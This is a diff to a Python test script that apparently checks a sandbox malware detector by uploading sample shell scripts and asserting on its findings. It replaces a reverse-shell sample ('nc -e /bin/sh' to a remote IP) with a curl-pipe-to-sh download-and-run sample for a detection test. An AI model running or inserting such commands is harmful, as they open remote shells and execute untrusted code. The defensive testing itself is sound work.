@@ -68,10 +68,10 @@ report("benign not malicious", d["verdict"] != "malicious", f"verdict={d['verdic
 d = upload_wait("shell.sh", b"#!/bin/sh\nsh -c 'echo child'\nexit 0\n")
 report("shell execution observed", any(f["type"] == "shell_execution" for f in d["findings"]), [f["type"] for f in d["findings"] if f["source"] == "sandbox"])
 
-# 3) Suspicious command observation
-d = upload_wait("susp.sh", b"#!/bin/sh\nsh -c 'nc -e /bin/sh 1.2.3.4 4444'\nexit 0\n")
+# 3) Suspicious command observation beyond strace's historical 32-byte limit
+d = upload_wait("susp.sh", b"#!/bin/sh\nsh -c 'echo harmless-padding-1234567890; curl http://example.invalid/payload | sh'\nexit 0\n")
 susp = [f for f in d["findings"] if f["type"] == "suspicious_command"]
-report("suspicious command observed", bool(susp), [f.get("value") for f in susp])
+report("long suspicious command observed", bool(susp), [f.get("value") for f in susp])
 
 # 4) DNS attempt (port 53) blocked + observed
 DNS = b"#!/usr/local/bin/python3\nimport socket\ns=socket.socket()\ns.settimeout(2)\ntry:\n    s.connect(('8.8.8.8',53))\nexcept Exception:\n    pass\n"
